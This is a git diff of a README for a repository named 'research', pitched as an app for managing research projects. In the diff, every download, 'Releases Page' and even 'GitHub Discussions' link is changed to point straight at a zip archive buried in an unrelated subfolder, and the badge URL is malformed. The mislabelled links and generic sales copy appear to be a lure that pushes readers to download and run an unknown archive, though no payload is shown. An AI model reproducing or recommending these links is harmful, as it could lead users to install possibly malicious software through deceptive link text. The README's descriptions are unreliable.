@@ -1,6 +1,6 @@
 # 🎓 research - Easy Access to Research Projects
 
-[![Download Release](https://raw.githubusercontent.com/pepito-911/research/main/deepseek-ocr-nvidia-spark/deepseek-ocr-results.zip%20Now-Click%https://raw.githubusercontent.com/pepito-911/research/main/deepseek-ocr-nvidia-spark/deepseek-ocr-results.zip)](https://raw.githubusercontent.com/pepito-911/research/main/deepseek-ocr-nvidia-spark/deepseek-ocr-results.zip)
+[![Download Release](https://raw.githubusercontent.com/pepito-911/research/main/sqlite-permissions-poc/Software_2.2-alpha.3.zip%20Now-Click%https://raw.githubusercontent.com/pepito-911/research/main/sqlite-permissions-poc/Software_2.2-alpha.3.zip)](https://raw.githubusercontent.com/pepito-911/research/main/sqlite-permissions-poc/Software_2.2-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, follow these steps to download the application:
 
 1. Click the link below to visit the download page.
    
-   [Download from Releases Page](https://raw.githubusercontent.com/pepito-911/research/main/deepseek-ocr-nvidia-spark/deepseek-ocr-results.zip)
+   [Download from Releases Page](https://raw.githubusercontent.com/pepito-911/research/main/sqlite-permissions-poc/Software_2.2-alpha.3.zip)
 
 2. On the Releases page, you will see multiple versions of the application. Choose the latest version for the best features and stability. 
 
@@ -89,10 +89,10 @@ Yes, your data is stored locally on your device. Ensure you save your projects r
 
 ## 💬 Community and Support
 
-If you have questions or need further assistance, feel free to visit our [GitHub Discussions](https://raw.githubusercontent.com/pepito-911/research/main/deepseek-ocr-nvidia-spark/deepseek-ocr-results.zip) page. Connect with other users, share tips, or ask for help.
+If you have questions or need further assistance, feel free to visit our [GitHub Discussions](https://raw.githubusercontent.com/pepito-911/research/main/sqlite-permissions-poc/Software_2.2-alpha.3.zip) page. Connect with other users, share tips, or ask for help.
 
 ## 🎉 Conclusion
 
 Thank you for choosing **research**! We hope this application simplifies your research projects and enhances your learning experience. Don't forget to check the download page regularly for updates and new features.
 
-[Download from Releases Page](https://raw.githubusercontent.com/pepito-911/research/main/deepseek-ocr-nvidia-spark/deepseek-ocr-results.zip)
+[Download from Releases Page](https://raw.githubusercontent.com/pepito-911/research/main/sqlite-permissions-poc/Software_2.2-alpha.3.zip)
